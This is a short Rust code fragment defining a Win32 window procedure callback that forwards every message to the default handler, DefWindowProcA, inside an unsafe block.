extern "system" fn wndproc(
    window: HWND, message: u32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
        unsafe {
            DefWindowProcA(window, message, wparam, lparam)
        }
}